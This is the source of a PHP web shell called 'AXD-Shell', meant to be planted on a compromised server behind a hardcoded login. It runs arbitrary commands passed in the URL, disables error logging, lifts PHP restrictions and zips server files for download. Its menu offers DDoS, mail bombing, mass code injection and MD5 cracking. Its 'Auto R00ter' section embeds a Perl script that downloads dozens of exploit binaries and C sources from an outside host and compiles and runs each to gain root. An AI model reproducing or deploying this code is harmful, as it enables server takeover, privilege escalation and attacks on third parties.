<html>
</html>
<?php

ini_set('max_execution_time',0);
ini_set('memory_limit','999999999M');


function Zip($source, $destination) // Thanks to Alix Axel
{
    if (!extension_loaded('zip') || !file_exists($source)) {
        return false;
    }

    $zip = new ZipArchive();
    if (!$zip->open($destination, ZIPARCHIVE::CREATE)) {
        return false;
    }

    $source = str_replace('\\', '/', realpath($source));

    if (is_dir($source) === true)
    {
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);

        foreach ($files as $file)
        {
            $file = str_replace('\\', '/', realpath($file));

            if (is_dir($file) === true)
            {
                $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
            }
            else if (is_file($file) === true)
            {
                $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
            }
        }
    }
    else if (is_file($source) === true)
    {
        $zip->addFromString(basename($source), file_get_contents($source));
    }

    return $zip->close();
}

if(isset($_GET['zip'])) {
	$src = $_GET['zip'];
	$dst = getcwd()."/".basename($_GET['zip']).".zip";
	if (Zip($src, $dst) != false) {
		$filez = file_get_contents($dst);
		header("Content-type: application/octet-stream");
		header("Content-length: ".strlen($filez));
		header("Content-disposition: attachment; filename=\"".basename($dst)."\";");
		echo $filez;
	}
	exit;
}

// ------------------------------------- Some header Functions (Need to be on top) ---------------------------------\

/**************** Defines *********************************/

$greeting 		= "UNDERGROUND";
$user 			= "axd";
$pass 			= "indonesia";
$lock 			= "on"; // set this to off if you dont need the login page
$antiCrawler 		= "off"; // set this to on if u dont want your shell to be publicised in Search Engines ! (It increases the shell's Life')
$tracebackFeature 	= "off"; // set this feature to on to enable email alerts
$ownerEmail 		= "AXD@gmail.com"; // Change this to your email , This email is used to deliver tracebacks about your shell
$url 			= (!empty($_SERVER['HTTPS'])) ? "https://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'] : "http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
$phpVersion		= phpversion();
$self			= $_SERVER["PHP_SELF"]; // Where am i
$sm 			= @ini_get('safe_mode');
$SEPARATOR 		= '/'; // Default Directory separator
$os 			= "N/D";

if(stristr(php_uname(),"Windows"))
{
        $SEPARATOR = '\\';
        $os = "Windows";
}

else if(stristr(php_uname(),"Linux"))
{
        $os = "Linux";
}

//*************************************************************/

// -------------- Traceback Functions

function sendLoginAlert()
{
    global $ownerEmail;
    global $url;
    $accesedIp = $_SERVER['REMOTE_ADDR'];
    $randomInt = rand(0,1000000);           # to avoid id blocking
    $from = "AXD-Shell$randomInt@fbi.gov"; 
    
    //echo $from;
    
    if(function_exists('mail'))
    {
        $subject = "Shell Accessed -- AXD-Shell --";
        $message = "
Hey Owner ,
        
        Your Shell(AXD-Shell) located at $url was accessed by $accesedIp
        
        If its not you :-
        
        1. Please check if the shell is secured.
        2. Change your user name and Password.
        3. Check if lock is 0n!

        Thanking You
        
Yours Faithfully
AXD-Shell
        ";
        mail($ownerEmail,$subject,$message,'From:'.$from);
    }
}

//---------------------------------------------------------


if(function_exists('session_start') && $lock == 'on')
{
    session_start();
}
else
{
    // The lock will be set to 'off' if the session_start fuction is disabled i.e if sessions are not supported 
    $lock = 'off';
}

//logout

if(isset($_GET['logout']) && $lock == 'on')
{
    $_SESSION['authenticated'] = 0;
    session_destroy();
    header("location: ".$_SERVER['PHP_SELF']);
}

ini_set('max_execution_time',0);



/***************** Restoring *******************************/


ini_restore("safe_mode_include_dir");
ini_restore("safe_mode_exec_dir");
ini_restore("disable_functions");
ini_restore("allow_url_fopen");
ini_restore("safe_mode");
ini_restore("open_basedir");

if(function_exists('ini_set'))
{
    ini_set('error_log',NULL);  // No alarming logs
    ini_set('log_errors',0);    // No logging of errors
    ini_set('file_uploads',1);  // Enable file uploads
    ini_set('allow_url_fopen',1);   // allow url fopen 
}

else
{
    ini_alter('error_log',NULL);
    ini_alter('log_errors',0);
    ini_alter('file_uploads',1);
    ini_alter('allow_url_fopen',1);
}

// ----------------------------------------------------------------------------------------------------------------


?>
<html>
<head>
<title>AXD-Shell | White Decrypt</title>

<?php
if($antiCrawler != 'off')
{
    ?>
    <meta name="ROBOTS" content="NOINDEX, NOFOLLOW" />
    <?php
}
?>

<style>

/*
==========================    
    CSS Section
==========================
*/

* {
    padding:0;
    margin:0;
}

html, body {
	height: 100%;
}

#container {
min-height: 100%;
margin-bottom: -330px;
position: relative;
}

#footer {
height: 330px;
position: relative;
background-color:black;
}

.clearfooter {
height: 330px;
clear: both;
}

.alert
{
    background:red;
    color:white;
    font-weight:bold;
}
td.info
{
    width:0px;
}

.bind 
{
    border: 1px solid #333333;
    margin: 15px auto 0;
    font-size: small;
}

div.end *
{
    font-size:small;
}

div.end 
{
    width:100%;
    background:#222;
}

p.blink
{
    text-decoration: blink;
}

body 
{
    background-color:black;
    color:rgb(35,182,39);
    font-family:Tahoma,Verdana,Arial;
    font-size: small;
}

input.own {
    background-color: Green;
    color: white;
    border : 1px solid #ccc;
}

blockquote.small
{
    font-size: smaller;
    color: silver;
    text-align: center;
}

table.files
{
    border-spacing: 10px;
    font-size: small;
}

h1 {
    padding: 4px;
    padding-bottom: 0px;
    margin-right : 5px;
}
div.logo
{
    border-right: 1px aqua solid;
}
div.header
{
    padding-left: 5px;
    font-size: small;
    text-align: left;
}
div.nav
{
    margin-top:1px;
    height:60px;
    background-color: #ccc;
}
div.nav ul
{
    list-style: none;
    padding: 4px;
}
div.nav li
{
    float: left;
    margin-right: 10px;
    text-align:center;
}
textarea.cmd
{
    border : 1px solid #111;
    background-color : green;
    font-family: Shell;
    color : white;
    margin-top: 30px;
    font-size:small;
}

input.cmd
{
    background-color:black;
    color: white;
    width: 400px;
    border : 1px solid #ccc;

}
td.maintext
{
    font-size: large;
}
#margins
{
    margin-left: 10px;
    margin-top: 10px;
    color:white;
}
table.top
{
    border-bottom: 1px solid aqua;
    width: 100%;
}
#borders
{
    border-top : 1px solid aqua;
    border-left:1px solid aqua;
    border-bottom: 1px solid aqua;
    border-right: 1px solid aqua;
    margin-bottom:0;
}
td.file a , .file a
{
    text-decoration:none;
}
a.dir
{
    font-weight:bold;
    text-decoration:none;
}
td.dir a
{
    text-decoration:none;
}
td.download,td.download2
{
    color:green;
}
#spacing
{
    padding:10px;
    margin-left:200px;
}
th.header
{
    background: none repeat scroll 0 0 #191919;
    color: white;
    border-bottom : 1px solid #333333;
}
p.alert_red
{
    background : red;
    color: white;
}

p.alert_green
{
    background : lightgreen;
    color: black;
}

#underground {font-size:270%;text-shadow:2px 2px 2px #FFFFF2;}
#kontainer {text-align:center;padding-top:20px;}
.inputan {text-align:center;width:300px;height:30px;margin-bottom:20px;color:black;}
.tombol {width:300px;height:30px;cursor:pointer;box-shadow:2px 2px 2px pink;}
.logo {font-size:250%;color:green;font-weight:bold;margin-right:0px;width:200px;text-align:center;text-shadow:2px 2px white;color:green}
/*

--------------------------------CSS END------------------------------------------------------

*/
</style>

</head>

<body text="rgb(39,245,10)" bgcolor="black">

<div id='container'>
<?php
if(isset($_POST['user']) && isset($_POST['pass']) && $lock == 'on')
{
    if( $_POST['user'] == $user &&
         $_POST['pass'] == $pass )
    {
            $_SESSION['authenticated'] = 1;
            // --------------------- Tracebacks --------------------------------
            if($tracebackFeature == 'On')
            {
                sendLoginAlert();
            }
            // ------------------------------------------------------------------
    }
}

if($lock == 'off')
{?>
    <p class="alert_red"><b>Lock is Switched Off! , The shell can be accessed by anyone!</b></p>
<?php
}

if($lock == 'on' && (!isset($_SESSION['authenticated']) || $_SESSION['authenticated']!=1) )
{

?>
<div id="kontainer">
<h1 id="underground"><?php echo $greeting;?></h1>
<br><i>Welcome to underground SIR!</i><br><br>
<form method="POST" action="<?php echo $_SERVER['PHP_SELF'];?>">
	<input name="user" value="" placeholder="Username" class="inputan"/><br>
	<input name="pass" type="password" Placeholder="Password" class="inputan"/><br>
	<input class="own tombol" type="Submit" value="Login"/>
</form>
</div>
<?php
}
//---------------------------------- We are authenticated now-------------------------------------
//Launch the shell
else 
{
    //---------------------------------- Fuctions ---------------------------------------------------

    function showDrives()
    {
        global $self;
        foreach(range('A','Z') as $drive)
        {
            if(is_dir($drive.':\\'))
            {
                ?>
                <a class="dir" href='<?php echo $self ?>?dir=<?php echo $drive.":\\"; ?>'>
                    <?php echo $drive.":\\" ?>
                </a> 
                <?php
            }
        }
    }

    function HumanReadableFilesize($size)
    {
 
        $mod = 1024;
 
        $units = explode(' ','B KB MB GB TB PB');
        for ($i = 0; $size > $mod; $i++) 
        {
            $size /= $mod;
        }
 
        return round($size, 2) . ' ' . $units[$i];
    }

function getClientIp()
{
    echo $_SERVER['REMOTE_ADDR'];
}

function getServerIp()
{
    echo getenv('SERVER_ADDR');
}
function getSoftwareInfo()
{
    echo php_uname();
}
function diskSpace()
{
    echo HumanReadableFilesize(disk_total_space("/"));
}
function freeSpace()
{
    echo HumanReadableFilesize(disk_free_space("/"));
}
function getSafeMode()
{
        global $sm;
		echo($sm?"ON (Most of the Features will Not Work)":"OFF");
        
}

function getDisabledFunctions()
{
    if(!ini_get('disable_functions'))
    {
		echo "None";
    }
    else
    {
			echo @ini_get('disable_functions');
    }
}

function getFilePermissions($file)
{
    
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
} else {
    // Unknown
    $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

return $info;

}

// Dir size

/**
 * Get the directory size
 * @param directory $directory
 * @return integer
 */
function dirSize($directory) {
    $size = 0;
    foreach(new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory)) as $file){
        try {       
            $size += $file->getSize();
        }
        catch (Exception $e){    // Symlinks and other shits
            $size += 0;
        }
    }
    return $size;
}

/***********************************************************/
// exec_all , A function used to execute commands , This function will only execute if the Safe Mode is
// Turned OFF!
/**********************************************************/


function exec_all($command)
{
    
    $output = '';
    if(function_exists('exec'))
    {   
        exec($command,$output);
        $output = join("\n",$output);
    }
    
    else if(function_exists('shell_exec'))
    {
        $output = shell_exec($command);
    }
    
    else if(function_exists('popen'))
    {
        $handle = popen($command , "r"); // Open the command pipe for reading
        if(is_resource($handle))
        {
            if(function_exists('fread') && function_exists('feof'))
            {
                while(!feof($handle))
                {
                    $output .= fread($handle, 512);
                }
            }
            else if(function_exists('fgets') && function_exists('feof'))
            {
                while(!feof($handle))
                {
                    $output .= fgets($handle,512);
                }
            }
        }
        pclose($handle);
    }
    
    
    else if(function_exists('system'))
    {
        ob_start(); //start output buffering
        system($command);
        $output = ob_get_contents();    // Get the ouput 
        ob_end_clean();                 // Stop output buffering
    }
    
    else if(function_exists('passthru'))
    {
        ob_start(); //start output buffering
        passthru($command);
        $output = ob_get_contents();    // Get the ouput 
        ob_end_clean();                 // Stop output buffering            
    }
    
    else if(function_exists('proc_open'))
    {
        $descriptorspec = array(
                1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
                );
        $handle = proc_open($command ,$descriptorspec , $pipes); // This will return the output to an array 'pipes'
        if(is_resource($handle))
        {
            if(function_exists('fread') && function_exists('feof'))
            {
                while(!feof($pipes[1]))
                {
                    $output .= fread($pipes[1], 512);
                }
            }
            else if(function_exists('fgets') && function_exists('feof'))
            {
                while(!feof($pipes[1]))
                {
                    $output .= fgets($pipes[1],512);
                }
            }
        }
        pclose($handle);
    }

    return(htmlspecialchars($output));
    
}

function magicQuote($text)
{
    if (!get_magic_quotes_gpc())
    {
        return $text;
    }
    return stripslashes($text);
}

function md5Crack($hash , $list)
{
    $fd = fopen($list,"r");
    if( strlen($hash) != 32  || $fd == FALSE)
    {
        // echo "$hash , " . strlen($hash) ." , $list , $fd"; // Debugging
        return "<p class='alert_red'>Hash or List invalid!</p>";
    }
    else
    {
        while (! feof( $fd ))
        {
            if( ($pwdList = fgets( $fd, 1024 )) == FALSE)
            {
                break;
            }
            $pwdList = trim($pwdList);
            
            if(md5($pwdList) == $hash )
            {
                    return "<script>alert('Password Cracked');</script>\n<h2>Hash Cracked</h2><br /><br />\n<p class='alert_green'>Planintext : $pwdList</p>";
            }
        }
            
    }
}

function exec_query_mysql($query,$sql_server,$sql_port,$sql_db,$sql_user,$sql_pass)
{
    $link = mysql_connect($sql_server.":".$port,$sql_user,$sql_pass);
    if(!$link)
    {
        return 'Could not connect: ' . mysql_error();
    }
    $resource = mysql_query($query);
    if(!$resource) return(mysql_error());
}

//------------------------------------------------------------------------------------------------


?>

<table class="top">
    <tbody>
        <tr>
            <td width="300px;">
            <div class="logo">
				AXD
            </div>
            </td>
            <td>
            <div class="header">
            <?php getSoftwareInfo(); ?><br />
Your IP : <?php getClientIp(); ?> <font color="silver" >|</font> Server IP : <?php getServerIp();?> <br />
            Safe Mode : <?php getSafeMode(); ?><br />
            <?php if($os == 'Windows'){ echo showDrives();} ?> <?php echo getcwd();?>
            </div>
            </td>
        </tr>
    </tbody>
</table>
<div class="header" id="borders">
            Server ADMIN: <?php echo $_SERVER['SERVER_ADMIN'];?> <font color="silver" >|</font>
            PHP VERSION : <?php echo $phpVersion; ?> <font color="silver" >|</font>
            Curl : <?php echo function_exists('curl_version')?("<font color='red'>Enabled</font>"):("Disabled"); ?> <font color="silver" >|</font>
            Oracle : <?php echo function_exists('ocilogon')?("<font color='red'>Enabled</font>"):("Disabled"); ?> <font color="silver" >|</font>
            MySQL : <?php  echo function_exists('mysql_connect')?("<font color='red'>Enabled</font>"):("Disabled");?> <font color="silver" >|</font>
            MSSQL : <?php echo function_exists('mssql_connect')?("<font color='red'>Enabled</font>"):("Disabled"); ?> <font color="silver" >|</font>
            PostgreSQL : <?php echo function_exists('pg_connect')?("<font color='red'>Enabled</font>"):("Disabled"); ?> <font color="silver" >|</font>
            Disable functions : <?php getDisabledFunctions(); ?> <font color="silver" >|</font>
            Space : <?php diskSpace(); ?> <font color="silver" >|</font>
            Free : <?php freeSpace(); ?>
        </table>
</div>
<div class="nav">
<ul>
    <li><a href="<?php echo $self;?>">Home</a></li>
    <li><a href="<?php echo $self.'?upload';?>">Upload</a></li>
    <li><a href="<?php echo $self.'?upload2';?>">Upload AXD Mode</a></li>
    <li><a href="<?php echo $self.'?shell';?>">Shell</a></li>
    <li><a href="<?php echo $self.'?r00t'?>">Aut0 R00t3r (Unix/Linux)</a></li>
    <li><a href="<?php echo $self.'?dos';?>">DDoS</a></li>
    <li><a href="<?php echo $self.'?fuzz';?>">Web-Server Fuzzer</a></li>
    <li><a href="<?php echo $self.'?mail'?>">Mass Mailer</a></li>
    <li><a href="<?php echo $self.'?bomb'?>">Mail Bomber</a></li>
    <li><a href="<?php echo $self.'?connect'?>">Connect</a></li>
    <li><a href="<?php echo $self.'?injector'?>">Mass Code Injector</a></li>
    <li><a href="<?php echo $self.'?obfuscate'?>">PHP Obfuscator</a></li>
    <li><a href="<?php echo $self.'?eval'?>">PHP Evaluate</a></li>
    <li><a href="<?php echo $self.'?md5'?>">MD5 Cracker</a></li>
    <li><a href="<?php echo $self.'?gdork'?>">Google Dork Creator</a></li>


    <?php if($lock == 'on')
    {
    ?>
        <li><a href="<?php echo $self.'?logout'?>">Log Out!</a></li>
    <?php
    }
    ?>
</ul>
</div>

<center>
<?php
//-------------------------------- Check what he wants -------------------------------------------

// Shell

if(isset($_GET['shell']))
{
    if(!isset($_GET['cmd']) || $_GET['cmd'] == '')
    {
        $result = "";    
    }
    else
    {
        $result=exec_all($_GET['cmd']);
    }
    ?>
    <textarea class="cmd" cols="100" rows="20"><?php echo $result;?></textarea><br /><br />
    <form action="<?php echo $self;?>" method="GET">
    <!-- For Shell -->
    <input name="shell" type="hidden" />
    <!-- For CMD -->
    <input name="cmd" class="cmd" />
    <input name="submit" value="Spin That Shit!" class="own" type="submit" />
    </form>
    <?php
}

// Auto Rooter (Linux/Unix Only!) with Perl Installed

else if(isset($_GET['r00t']))
{
    // Note : The Perl Auto Rooter Perl Script was originally written by iskorpitx , All credits to him for an awesome
    // Piece of code , and thanks to eXes0ul for providing me the links . ;) 
    
    $r00t =
'
#!/usr/bin/perl 
# Exploit tools v2.0 coded by AXD
# linux serverlerde gecerlidir
# AXD
# copyright 2017
{ 
system("wget http://war1971.com/CMS_FILES/file/cc/iskorpitx");  
system("chmod 777 iskorpitx"); 
system("./iskorpitx"); 
system("id"); 
system("wget http://war1971.com/CMS_FILES/file/cc/44");  
system("chmod 777 44"); 
system("./44"); 
system("id");
system("wget http://war1971.com/CMS_FILES/file/cc/9521");  
system("chmod 777 9521"); 
system("./9521"); 
system("id");  
system("wget http://war1971.com/CMS_FILES/file/cc/froot");  
system("chmod 777 froot"); 
system("./froot"); 
system("id");
system("id");
system("id");
system("id");
system("id");
system("wget 27704.c downloads.securityfocus.com/vulnerabilities/exploits/27704.c"); 
system("gcc 27704.c -o 27704");  
system("chmod 777 27704"); 
system("./27704"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/18-1.c"); 
system("gcc -Wall -o 18-1 18-1.c"); 
system("gcc -Wall -m64 -o 18-3 18-1.c"); 
system("chmod 777 18-1"); 
system("chmod 777 18-3"); 
system("./18-1"); 
system("id"); 
system("./18-3"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/18-2");  
system("chmod 777 18-2"); 
system("./18-2"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/18-1");  
system("chmod 777 18-1"); 
system("./18-1"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/run");  
system("chmod 777 run"); 
system("./run"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/exploit.c");  
print "If u r r00t stop xpl with ctrl+c\n";
system("wget run_exploits.sh wget http://war1971.com/CMS_FILES/file/cc/run_exploits.sh");  
system("chmod 777 run_exploits.sh"); 
system("./run_exploits.sh"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/exploit");  
system("chmod 777 exploit"); 
system("./exploit"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/run2");  
system("chmod 777 run2"); 
system("./run2"); 
system("id"); 
system("wget exp http://war1971.com/CMS_FILES/file/cc/exp");  
system("chmod 777 exp"); 
system("./exp"); 
system("id"); 
system("wget http://war1971.com/CMS_FILES/file/cc/exp1");  
system("chmod 777 exp1"); 
system("./exp1"); 
system("id"); 
system("wget http://war1971.com/CMS_FILES/file/cc/exp2");  
system("chmod 777 exp2"); 
system("./exp2"); 
system("id"); 
system("wget http://war1971.com/CMS_FILES/file/cc/exp3");  
system("chmod 777 exp3"); 
system("./exp3"); 
system("id"); 
system("wget exp4 http://war1971.com/CMS_FILES/file/cc/exp4");  
system("chmod 777 exp4"); 
system("./exp4"); 
system("id"); 
system("wget http://war1971.com/CMS_FILES/file/cc/exp5");  
system("chmod 777 exp5"); 
system("./exp5"); 
system("id"); 
system("wget http://war1971.com/CMS_FILES/file/cc/exp6");  
system("chmod 777 exp6"); 
system("./exp6"); 
system("id"); 
system("wget http://war1971.com/CMS_FILES/file/cc/exp7");  
system("chmod 777 exp7"); 
system("./exp7"); 
system("id"); 
system("wget http://war1971.com/CMS_FILES/file/cc/exp8");  
system("chmod 777 exp8"); 
system("./exp8"); 
system("id"); 
system("wget http://war1971.com/CMS_FILES/file/cc/exp9");  
system("chmod 777 exp9"); 
system("./exp9"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/run2");  
system("chmod 777 run2"); 
system("./run2"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/run2");  
system("chmod 777 run2"); 
system("./run2"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/exploit");  
system("chmod 777 exploit"); 
system("./exploit"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/exploit2");  
system("chmod 777 exploit2"); 
system("./exploit2"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/exploit2");  
system("chmod 777 exploit2"); 
system("./exploit2"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/run2");  
system("chmod 777 run2"); 
system("./run2"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/2009-1");  
system("chmod 777 2009-1"); 
system("./2009-1"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/derle.c"); 
system("gcc derle.c -o derle");  
system("chmod 777 derle"); 
system("./derle"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/3.c"); 
system("gcc 3.c -o 3");  
system("chmod 777 3"); 
system("./3"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/3a"); 
system("chmod 777 3a"); 
system("./3a"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/4.c"); 
system("gcc 4.c -o 4");  
system("chmod 777 4"); 
system("./4"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/4a"); 
system("chmod 777 4a"); 
system("./4a"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n"; 
system("wget http://war1971.com/CMS_FILES/file/cc/cx.c"); 
system("gcc cx.c -o cx");  
system("chmod 777 cx"); 
system("./cx"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n"; 
system("wget http://war1971.com/CMS_FILES/file/cc/cxx.c"); 
system("gcc cxx.c- o cxx");  
system("chmod 777 cxx"); 
system("./cxx"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n"; 
system("wget http://war1971.com/CMS_FILES/file/cc/exploit2"); 
system("chmod 777 exploit2"); 
system("./exploit2"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n"; 
system("wget run http://war1971.com/CMS_FILES/file/cc/run"); 
system("chmod 777 run"); 
system("./run"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n"; 
system("wget http://war1971.com/CMS_FILES/file/cc/run.sh");  
system("chmod 777 run.sh"); 
system("./run.sh"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/29.c"); 
system("gcc 29.c -o 29");  
system("chmod 777 29"); 
system("./29"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("http://war1971.com/CMS_FILES/file/cc/30");  
system("chmod 777 30"); 
system("./30"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/2009");  
system("chmod 777 2009"); 
system("./2009"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/iskorpitx");  
system("chmod 777 iskorpitx"); 
system("./iskorpitx"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/c");  
system("chmod 777 c"); 
system("./c"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/cx");  
system("chmod 777 cx"); 
system("./cx"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/derle2");  
system("chmod 777 derle2"); 
system("./derle2"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/derle");  
system("chmod 777 derle"); 
system("./derle"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/6x.c");  
system("gcc 6x.c -o 6xa"); 
system("./6xa"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/6x");  
system("chmod 777 6x"); 
system("./6x"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/6b");  
system("chmod 777 6b"); 
system("./6b"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/6xx");  
system("chmod 777 6xx"); 
system("./6xx"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/27704");  
system("chmod 777 27704"); 
system("./27704"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/derle2.c"); 
system("gcc derle2.c -o derle2");  
system("chmod 777 derle2"); 
system("./derle2"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/derle2"); 
system("chmod 777 derle2"); 
system("./derle2"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n"; 
system("wget http://war1971.com/CMS_FILES/file/cc/28.c"); 
system("gcc 28.c -o 28"); 
system("chmod 777 28"); 
system("./28"); 
system("id"); 
system("./28"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n"; 
system("wget http://war1971.com/CMS_FILES/file/cc/27.c"); 
system("gcc 27.c -o 27"); 
system("chmod 777 27"); 
system("./27"); 
system("id"); 
system("./27"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n"; 
system("wget http://war1971.com/CMS_FILES/file/cc/c.c"); 
system("gcc c.c -o c"); 
system("chmod 777 c"); 
system("./c"); 
system("id"); 
system("./c"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n"; 
system("wget http://war1971.com/CMS_FILES/file/cc/c2.c"); 
system("gcc c2.c -o c2"); 
system("chmod 777 c2"); 
system("./c2"); 
system("id"); 
system("./c2"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n"; 
system("wget http://war1971.com/CMS_FILES/file/cc/05"); 
system("chmod 777 05"); 
system("./05"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n"; 
system("wget http://war1971.com/CMS_FILES/file/cc/isko"); 
system("chmod 777 isko"); 
system("./isko"); 
system("id");
system("./isko"); 
system("isko");
print "If u r r00t stop xpl with ctrl+c\n"; 
system("wget http://war1971.com/CMS_FILES/file/cc/18"); 
system("chmod 777 18"); 
system("./18"); 
system("id"); 
system("./18"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n"; 
system("wget http://war1971.com/CMS_FILES/file/cc/7"); 
system("chmod 777 7"); 
system("./7"); 
system("id"); 
system("./7"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n"; 
system("wget http://war1971.com/CMS_FILES/file/cc/7-2"); 
system("chmod 777 7-2"); 
system("./7-2"); 
system("id"); 
system("./7-2"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n"; 
system("wget http://war1971.com/CMS_FILES/file/cc/8"); 
system("chmod 777 8"); 
system("./8"); 
system("id"); 
system("./8"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n"; 
system("wget http://war1971.com/CMS_FILES/file/cc/8a"); 
system("chmod 777 8a"); 
system("./8a"); 
system("id"); 
system("./8a"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n"; 
system("wget http://war1971.com/CMS_FILES/file/cc/8bb"); 
system("chmod 777 8bb"); 
system("./8bb"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n"; 
system("wget http://war1971.com/CMS_FILES/file/cc/8cc"); 
system("chmod 777 8cc"); 
system("./8cc"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n"; 
system("wget http://war1971.com/CMS_FILES/file/cc/8x"); 
system("chmod 777 8x"); 
system("./8x"); 
system("id"); 
system("./8x"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n"; 
system("wget http://war1971.com/CMS_FILES/file/cc/9"); 
system("chmod 777 9"); 
system("./9"); 
system("id"); 
system("./9"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n"; 
system("wget http://war1971.com/CMS_FILES/file/cc/krad2"); 
system("chmod 777 krad2"); 
system("./krad2"); 
system("id"); 
